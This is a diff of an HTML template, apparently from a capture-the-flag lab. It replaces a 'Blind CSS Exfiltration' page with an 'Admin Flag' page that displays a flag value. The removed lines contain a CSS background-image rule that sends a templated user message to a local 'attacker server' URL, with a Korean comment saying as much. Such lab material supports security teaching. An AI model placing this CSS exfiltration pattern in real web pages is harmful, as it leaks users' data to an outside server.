@@ -3,22 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Blind CSS Exfiltration</title>
-  <style>
-    body {
-      background-color: black;
-      color: white;
-    }
-    input[type="text"] {
-      background-image: url("http://localhost:4000/?exfil=<%= message %>");
-    }
-  </style>
+  <title>Flag</title>
 </head>
 <body>
-  <h1>Blind CSS Exfiltration</h1>
-  <p>Your message has been received:</p>
-  <input type="text" id="userMessage" value="<%= message %>" readonly>
+  <h1>Admin Flag</h1>
+  <p>Congratulations! Here is your flag:</p>
+  <p><%= flag %></p>
 </body>
 </html>
-
-<!--공격자 서버로: http://localhost:4000/?exfil=<%= message %> -->
